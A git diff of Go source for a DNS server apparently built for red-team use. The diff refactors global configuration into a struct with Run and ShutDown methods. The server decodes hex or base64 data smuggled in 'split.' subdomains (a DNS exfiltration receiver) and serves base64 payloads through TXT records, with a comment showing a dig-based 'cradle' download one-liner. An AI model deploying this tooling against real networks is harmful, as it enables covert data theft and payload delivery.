@@ -23,6 +23,8 @@ import (
 // 		dig +short @127.0.0.1 -p 5354 cradle.test.com TXT|sed 's/ //g;s/"//g'|base64 -d
 
 type DNSConfig struct {
+	Addr          string
+	Port          string
 	DefaultAnswer string
 	CustomAnswers map[string]string
 	TXTRecords    map[string]string
@@ -30,65 +32,77 @@ type DNSConfig struct {
 	Cmds          map[string]func(string)
 	JSONDoLog     bool
 	JSONLogFile   string
+	Running       bool
+	server        *dns.Server
 }
 
-var DnsCfg DNSConfig
+func New() *DNSConfig {
+	ret := &DNSConfig{}
+	ret.Cmds = make(map[string]func(string))
+	ret.Cmds["file"] = cmdFile
+	ret.TXTRecords = make(map[string]string)
+	ret.CustomAnswers = make(map[string]string)
+	return ret
+}
 
-func Run() {
-	DnsCfg.Cmds = make(map[string]func(string))
+func (dc *DNSConfig) ShutDown() {
+	log.Println("Shutting down the DNS server...")
+	dc.server.Shutdown()
+	dc.Running = false
+}
 
-	DnsCfg.Cmds["file"] = cmdFile
-
-	dns.HandleFunc(".", handler)
-	server := &dns.Server{Addr: "127.0.0.1:5354", Net: "udp"}
-	log.Printf("Starting DNS at %s\n", server.Addr)
-	err := server.ListenAndServe()
-	defer server.Shutdown()
+func (dc *DNSConfig) Run() {
+	dc.Running = true
+	dns.HandleFunc(".", dc.handler)
+	dc.server = &dns.Server{Addr: dc.Addr + ":" + dc.Port, Net: "udp"}
+	log.Printf("Starting DNS at %s\n", dc.server.Addr)
+	err := dc.server.ListenAndServe()
+	defer dc.server.Shutdown()
 	if err != nil {
-		log.Fatalf("Failed to start DNS server: %s\n ", err.Error())
+		log.Printf("Failed to start DNS server: %s\n ", err.Error())
 	}
+	dc.Running = false
 }
 
-func handler(w dns.ResponseWriter, r *dns.Msg) {
+func (dc *DNSConfig) handler(w dns.ResponseWriter, r *dns.Msg) {
 	m := new(dns.Msg)
 	m.SetReply(r)
 	m.Compress = false
 
 	switch r.Opcode {
 	case dns.OpcodeQuery:
-		parseQuery(m, w, r)
+		dc.parseQuery(m, w, r)
 	}
 	w.WriteMsg(m)
 }
 
-func parseQuery(m *dns.Msg, w dns.ResponseWriter, r *dns.Msg) {
+func (dc *DNSConfig) parseQuery(m *dns.Msg, w dns.ResponseWriter, r *dns.Msg) {
 	for _, question := range m.Question {
-
 		switch question.Qtype {
 		case dns.TypeA:
-			handleA(question, m, w, r)
+			dc.handleA(question, m, w, r)
 
 		case dns.TypeTXT:
-			handleTXT(question, m, w, r)
+			dc.handleTXT(question, m, w, r)
 		}
 	}
 }
 
-func handleA(question dns.Question, m *dns.Msg, w dns.ResponseWriter, r *dns.Msg) {
+func (dc *DNSConfig) handleA(question dns.Question, m *dns.Msg, w dns.ResponseWriter, r *dns.Msg) {
 	// TODO: add blacklisting
 	// set default generic response
-	answer := DnsCfg.DefaultAnswer
+	answer := dc.DefaultAnswer
 	// handle custom specified with full domain
-	if DnsCfg.CustomAnswers[question.Name] != "" {
-		answer = DnsCfg.CustomAnswers[question.Name]
+	if dc.CustomAnswers[question.Name] != "" {
+		answer = dc.CustomAnswers[question.Name]
 	}
 	// handle custom specified as just a sub
-	sub := stripDomain(question.Name)
-	if DnsCfg.CustomAnswers[sub] != "" {
-		answer = DnsCfg.CustomAnswers[sub]
+	sub := dc.stripDomain(question.Name)
+	if dc.CustomAnswers[sub] != "" {
+		answer = dc.CustomAnswers[sub]
 	}
 
-	ex := parseForExfil(question.Name)
+	ex := dc.parseForExfil(question.Name)
 
 	// return response
 	rrStr := fmt.Sprintf("%s A %s", question.Name, answer)
@@ -96,7 +110,7 @@ func handleA(question dns.Question, m *dns.Msg, w dns.ResponseWriter, r *dns.Msg
 	if err == nil {
 		m.Answer = append(m.Answer, rr)
 	}
-	LogQuery(question, m, w, r, answer)
+	dc.LogQuery(question, m, w, r, answer)
 
 	if len(ex) > 0 {
 		log.Printf("A request for %s from %s\n     ├─ Response: %s\n", question.Name, w.RemoteAddr().String(), answer)
@@ -106,10 +120,10 @@ func handleA(question dns.Question, m *dns.Msg, w dns.ResponseWriter, r *dns.Msg
 	}
 }
 
-func handleTXT(question dns.Question, m *dns.Msg, w dns.ResponseWriter, r *dns.Msg) {
+func (dc *DNSConfig) handleTXT(question dns.Question, m *dns.Msg, w dns.ResponseWriter, r *dns.Msg) {
 	sub := getFirstSub(question.Name)
 	var txt string
-	if txt = DnsCfg.TXTRecords[sub]; txt == "" {
+	if txt = dc.TXTRecords[sub]; txt == "" {
 		txt = "NOT FOUND"
 	}
 	rrStr := fmt.Sprintf("%s TXT %s", question.Name, base64.StdEncoding.EncodeToString([]byte(txt)))
@@ -117,12 +131,12 @@ func handleTXT(question dns.Question, m *dns.Msg, w dns.ResponseWriter, r *dns.M
 	if err == nil {
 		m.Answer = append(m.Answer, rr)
 	}
-	LogQuery(question, m, w, r, sub)
+	dc.LogQuery(question, m, w, r, sub)
 	log.Printf("TXT request for %s from %s:\n     └─ Sent: \"%s\" TXT record\n", question.Name, w.RemoteAddr().String(), sub)
 }
 
-func stripDomain(d string) string {
-	return strings.TrimRight(strings.ReplaceAll(d, DnsCfg.Domain, ""), ".")
+func (dc *DNSConfig) stripDomain(d string) string {
+	return strings.TrimRight(strings.ReplaceAll(d, dc.Domain, ""), ".")
 }
 
 func getFirstSub(s string) string {
@@ -133,10 +147,10 @@ func cmdFile(a string) {
 	// TODO: handle file.filename.test.com
 }
 
-func parseForExfil(q string) []string {
+func (dc *DNSConfig) parseForExfil(q string) []string {
 	var ret []string
 	if getFirstSub(q) == "split" {
-		clean := strings.ReplaceAll(strings.ReplaceAll(stripDomain(q), "split.", ""), ".", "")
+		clean := strings.ReplaceAll(strings.ReplaceAll(dc.stripDomain(q), "split.", ""), ".", "")
 		ret = append(ret, strings.TrimRight(decodeHexOrBase64(clean), "\n"))
 		return ret
 	}
